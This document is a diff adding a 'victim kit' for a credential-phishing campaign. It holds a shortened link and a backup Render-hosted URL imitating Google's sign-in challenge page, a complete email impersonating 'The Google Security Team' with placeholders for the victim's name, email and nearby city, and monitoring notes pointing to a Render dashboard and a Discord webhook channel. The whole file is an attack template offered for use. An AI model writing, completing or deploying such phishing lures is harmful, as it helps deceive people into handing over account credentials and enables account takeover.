@@ -1,0 +1,26 @@
+=== VICTIM KIT ===
+
+1. THE LINK TO SEND:
+https://bit.ly/YOUR_SHORT_LINK
+
+2. THE DIRECT RENDER URL (Backup):
+https://YOUR_RENDER_URL.onrender.com/service/lp/challenge?hl=en&flowName=GlifWebSignIn&flowEntry=AccountPicker&authuser=0
+
+3. THE MESSAGE:
+Subject: Action Required: Unusual sign-in activity on your Google Account
+
+Hi [VICTIM_NAME],
+
+Our security systems detected a sign-in attempt to your account ([VICTIM_EMAIL]) from an unrecognized device in [CITY_NEAR_VICTIM].
+
+If this was you, no action is needed. If this wasn't you, please secure your account immediately by re-verifying your identity.
+
+Verify Identity: https://bit.ly/YOUR_SHORT_LINK
+
+This is a standard security measure to protect your data. If you continue to experience issues, contact Google Support.
+
+— The Google Security Team
+
+4. MONITORING:
+- Render Dashboard: https://dashboard.render.com
+- Discord Webhook Channel: [CHANNEL_NAME]
